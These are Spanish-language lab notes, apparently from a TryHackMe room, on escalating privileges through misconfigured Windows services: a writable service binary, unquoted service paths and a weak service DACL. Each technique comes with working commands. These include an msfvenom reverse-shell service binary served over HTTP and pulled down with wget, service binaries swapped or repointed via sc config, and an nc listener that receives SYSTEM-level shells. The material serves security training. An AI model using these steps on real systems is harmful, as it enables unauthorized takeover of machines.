## Windows services
Service Control Manager (SCM)
- Query service
```
sc qc
DESCRIPTION:
        Queries the configuration information for a service.
USAGE:
        sc <server> qc [service name] <bufferSize>
```
- Ejemplo:
```
C:\Users\thm-unpriv>sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```
- Cada servicio tiene asociado un DACL que indica sus permisos, que se pueden ver con la utileria `ProcessHacker`
- Todas las confguraciones de los servicios se almacenan en `HLKM\SYSTEM\CurrentControlSet\Services`

### Permisos inseguros en el ejecutable asociado al servicio
- Hacemos query a otro servicio, observamos que `Everyone` tiene el permiso de modificar `M`
```
C:\Users\thm-unpriv>sc qc windowsscheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr1

C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

C:\Users\thm-unpriv>
```

- En la máquina atacante, creamos un payload para el ataque con `msfvenom` y lo servimos a traves de un puerto:
```bash
root@ip-10-10-146-33:~# msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.146.33 lport=4445 -f exe-service -o rev-svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe

root@ip-10-10-146-33:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- En la máquina Windows, en powershell, lo descargamos 
```
PS C:\Users\thm-unpriv> wget http://10.10.146.33:8000/rev-svc.exe
```

- En la maquina con windows, hacemos un respaldo del servicio anterior
```
C:\Users\thm-unpriv>cd C:\PROGRA~2\SYSTEM~1\
C:\PROGRA~2\SYSTEM~1>move WService.exe WService.exe.bkp
C:\PROGRA~2\SYSTEM~1>move c:\users\thm-unpriv\rev-svc.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1>move rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1>icacls WService.exe /grant Everyone:F
processed file: WService.exe
Successfully processed 1 files; Failed processing 0 files
```
- Ponemos listener en la máquina atacante
```
root@ip-10-10-146-33:~# nc -lnvp 4445
Listening on [0.0.0.0] (family 0, port 4445)
```
- En la máquna windows detenemos y lanzamos el servicio:
```
C:\PROGRA~2\SYSTEM~1>sc stop windowsscheduler
C:\PROGRA~2\SYSTEM~1>sc start windowsscheduler
```
- El reverse shell llega aca:
```
root@ip-10-10-146-33:~# nc -lnvp 4445
Listening on [0.0.0.0] (family 0, port 4445)
Connection from 10.10.225.50 49886 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

## Unquoted Service Paths
- Cuando un servicio en la ruta del ejecuable NO tiene las comas para rutas con espacios:
- Correcto: `C:\Program Files\RealVNC\VNC Server\vncserver.exe`
- Incorrecto y el que explotaremos: `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`

- En este caso para el ejemplo tenemos, donde `BUILTIN\Users` tiene permisos para crear y modificar archivos en ese directorio
```
C:\MyPrograms>icacls .
. NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  BUILTIN\Users:(I)(OI)(CI)(RX)
  BUILTIN\Users:(I)(CI)(AD)
  BUILTIN\Users:(I)(CI)(WD)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```
- Copiamos nuevamente el payload de msfvenom co el nombre de `disk` a esta ruta:
```
C:\MyPrograms>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\MyPrograms

12/06/2022  03:26 AM    <DIR>          .
12/06/2022  03:26 AM    <DIR>          ..
05/03/2022  03:16 PM    <DIR>          Disk Sorter Enterprise
12/06/2022  03:02 AM            48,640 Disk.exe
05/03/2022  07:44 PM    <DIR>          THMService
               1 File(s)         48,640 bytes
               4 Dir(s)  15,016,955,904 bytes free

C:\MyPrograms>sc stop "disk sorter enterprise"

C:\MyPrograms>sc start "disk sorter enterprise"


```

- En el listenner del atacante todo se da:
```
root@ip-10-10-146-33:~# nc -lnvp 4445
Listening on [0.0.0.0] (family 0, port 4445)
Connection from 10.10.225.50 49896 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd %userprofile%/desktop
cd %userprofile%/desktop

C:\Users\svcusr2\Desktop>type flag.txt
type flag.txt
THM{QUOTES_EVERYWHERE}
C:\Users\svcusr2\Desktop>
```

## Permisos inseguros del servicio

- Verificar los permisos de un servicio con `accesschk64.exe`, su `DACL` y no son los del ejecutable del servicio, si no los del servicio en si mismo.
- Observamos que 
```
[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

```
C:\tools\AccessChk>accesschk64.exe -qlc thmservice

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

thmservice
  DESCRIPTOR FLAGS:
      [SE_DACL_PRESENT]
      [SE_SACL_PRESENT]
      [SE_SELF_RELATIVE]
  OWNER: NT AUTHORITY\SYSTEM
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  [2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

C:\tools\AccessChk>
```

- Nuevamente generar el payload de msfvenom en la máquina del atacante:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.3.78 LPORT=4446 -f exe-service -o rev-svc2.exe`

- Descargarlo en la máquina victima: 
`wget http://10.10.3.78:8000/rev-svc2.exe`

- Le damos permisos:  
```cmd
C:\Users\thm-unpriv>icacls rev-svc2.exe /grant Everyone:F
processed file: rev-svc2.exe
Successfully processed 1 files; Failed processing 0 files
```
- Cambiamos la configuración del servicio:
```cmd
C:\Users\thm-unpriv>sc config THMService binPath="C:\Users\thm-unpriv\rev-svc2.exe" obj=LocalSystem
[SC] ChangeServiceConfig SUCCESS
```
- Reiniciamos el servicio
```
C:\Users\thm-unpriv>sc stop THMService
[SC] ControlService FAILED 1062:

The service has not been started.


C:\Users\thm-unpriv>sc start THMService

SERVICE_NAME: THMService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 3792
        FLAGS              :

C:\Users\thm-unpriv>
```
- Ponemos antes listener en la atacante
```bash
root@ip-10-10-3-78:~# nc -lnvp 4446
Listening on [0.0.0.0] (family 0, port 4446)
Connection from 10.10.39.85 49831 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```
